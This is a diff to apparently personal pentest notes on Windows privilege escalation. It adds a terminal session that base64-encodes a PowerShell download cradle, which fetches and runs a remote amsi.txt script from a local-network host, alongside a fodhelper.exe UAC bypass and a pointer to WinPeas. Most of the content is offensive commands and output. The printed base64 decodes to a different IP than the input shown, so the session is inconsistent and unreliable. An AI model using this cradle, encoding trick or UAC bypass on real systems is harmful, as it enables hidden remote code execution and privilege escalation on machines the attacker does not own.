@@ -46,6 +46,31 @@ From powershell throw this commands:
 						             -> if you are in a x64 process: c:\windows\system32\fodhelper.exe
 						
 The base64 powershell encoded string was -> IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.1/amsi.txt')
+
+Encoding a base64 powershell command from linux:
+
+~# pwsh
+❯ pwsh
+PowerShell 7.2.1
+Copyright (c) Microsoft Corporation.
+
+https://aka.ms/powershell
+Type 'help' to get help.
+
+   A new PowerShell stable release is available: v7.3.4 
+   Upgrade now, or check out the release page at:       
+     https://aka.ms/PowerShell-Release?tag=v7.3.4       
+
+Welcome to Parrot OS 
+
+┌[trike@root]-[11:11-12/07]-[/home/trike]
+└╼$ $text = "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.1/amsi.txt')"
+┌[trike@root]-[11:11-12/07]-[/home/trike]
+└╼$ $bytes = [System.Text.Encoding]::Unicode.GetBytes($text)                                   ┌[trike@root]-[11:11-12/07]-[/home/trike]
+└╼$ $EncodedText = [Convert]::ToBase64String($bytes)                                           ┌[trike@root]-[11:11-12/07]-[/home/trike]
+└╼$ $EncodedText                                                                              SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADUALwBhAG0AcwBpAC4AdAB4AHQAJwApAA==
+┌[trike@root]-[11:11-12/07]-[/home/trike]
+└╼$ 
 ```
 
 Additionally to this techniques I would recomend you to use the [WinPeas](https://github.com/carlospolop/PEASS-ng/) script in order to enumerate other posible privilege escalation avenues.
